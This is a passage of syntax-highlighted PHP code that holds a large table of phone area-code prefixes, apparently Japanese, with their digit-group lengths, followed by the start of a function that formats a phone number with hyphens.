            <span class="s1">'0959'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0966'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0965'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0964'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0950'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0949'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0942'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0940'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0930'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0943'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0944'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0948'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0947'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0946'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0967'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0968'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0987'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0986'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0985'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0984'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0993'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0994'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0997'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0996'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0995'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0983'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0982'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0973'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0972'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0969'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0974'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0977'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0980'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0979'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0978'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0920'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0898'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0855'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0854'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0853'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0553'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0856'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0857'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0863'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0859'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0858'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0848'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0847'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0835'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0834'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0833'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0836'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0837'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0846'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0845'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0838'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0865'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0866'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0892'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0889'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0887'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0893'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0894'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0897'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0896'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0895'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0885'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0884'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0869'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0868'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0867'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0875'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0877'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0883'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0880'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0879'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0829'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0550'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0228'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0226'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0225'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0224'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0229'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0233'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0237'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0235'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0234'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0223'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0220'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0192'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0191'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0187'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0193'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0194'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0198'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0197'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0195'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0238'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0240'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0260'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0259'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0258'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0257'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0261'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0263'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0266'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0265'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0264'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0256'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0255'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0243'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0242'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0241'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0244'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0246'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0254'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0248'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0247'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0186'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0185'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0144'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0143'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0142'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0139'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0145'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0146'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0154'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0153'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0152'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0138'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0137'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0125'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0124'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0123'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0126'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0133'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0136'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0135'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0134'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0155'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0156'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0176'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0175'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0174'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0178'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0179'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0184'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0183'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0182'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0173'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0172'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0162'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0158'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0157'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0163'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0164'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0167'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0166'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0165'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0267'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0250'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0533'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0422'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0532'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0531'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0436'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0428'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0536'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0299'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0294'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0293'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0475'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0295'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0297'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0296'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0495'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0438'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0466'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0465'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0467'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0478'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0476'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0470'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0463'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0479'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0493'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0494'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0439'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0268'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0480'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0460'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0538'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0537'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0539'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0279'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0548'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0280'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0282'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0278'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0277'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0269'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0270'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0274'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0276'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0283'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0551'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0289'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0287'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0547'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0288'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0544'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0545'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0284'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0291'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0285'</span> <span class="o">=&gt;</span> <span class="mi">2</span><span class="p">,</span>
            <span class="s1">'0120'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'0570'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'0800'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'0990'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
        <span class="p">),</span>
        <span class="mi">3</span> <span class="o">=&gt;</span> 
        <span class="k">array</span> <span class="p">(</span>
            <span class="s1">'099'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'054'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'058'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'098'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'095'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'097'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'052'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'053'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'011'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'096'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'049'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'015'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'048'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'072'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'084'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'028'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'024'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'076'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'023'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'047'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'029'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'075'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'025'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'055'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'026'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'079'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'082'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'027'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'078'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'077'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'083'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'022'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'086'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'089'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'045'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'044'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'092'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'046'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'017'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'093'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'059'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'073'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'019'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'087'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'042'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'018'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'043'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'088'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'050'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
        <span class="p">),</span>
        <span class="mi">2</span> <span class="o">=&gt;</span> 
        <span class="k">array</span> <span class="p">(</span>
            <span class="s1">'04'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
            <span class="s1">'03'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
            <span class="s1">'06'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
        <span class="p">),</span>
    <span class="p">);</span>
    <span class="nv">$groups</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">+=</span> 
        <span class="nv">$strict</span> <span class="o">?</span>
        <span class="k">array</span><span class="p">(</span>
            <span class="s1">'020'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'070'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'080'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
            <span class="s1">'090'</span> <span class="o">=&gt;</span> <span class="mi">3</span><span class="p">,</span>
        <span class="p">)</span> <span class="o">:</span>
        <span class="k">array</span><span class="p">(</span>
            <span class="s1">'020'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
            <span class="s1">'070'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
            <span class="s1">'080'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
            <span class="s1">'090'</span> <span class="o">=&gt;</span> <span class="mi">4</span><span class="p">,</span>
        <span class="p">)</span>
    <span class="p">;</span>
    <span class="nv">$number</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/[^\d]++/'</span><span class="p">,</span> <span class="s1">''</span><span class="p">,</span> <span class="nv">$input</span><span class="p">);</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$groups</span> <span class="k">as</span> <span class="nv">$len</span> <span class="o">=&gt;</span> <span class="nv">$group</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$area</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$number</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$len</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$group</span><span class="p">[</span><span class="nv">$area</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$formatted</span> <span class="o">=</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">'-'</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
                <span class="nv">$area</span><span class="p">,</span>
                <span class="nb">substr</span><span class="p">(</span><span class="nv">$number</span><span class="p">,</span> <span class="nv">$len</span><span class="p">,</span> <span class="nv">$group</span><span class="p">[</span><span class="nv">$area</span><span class="p">]),</span>
                <span class="nb">substr</span><span class="p">(</span><span class="nv">$number</span><span class="p">,</span> <span class="nv">$len</span> <span class="o">+</span> <span class="nv">$group</span><span class="p">[</span><span class="nv">$area</span><span class="p">])</span>
            <span class="p">));</span>
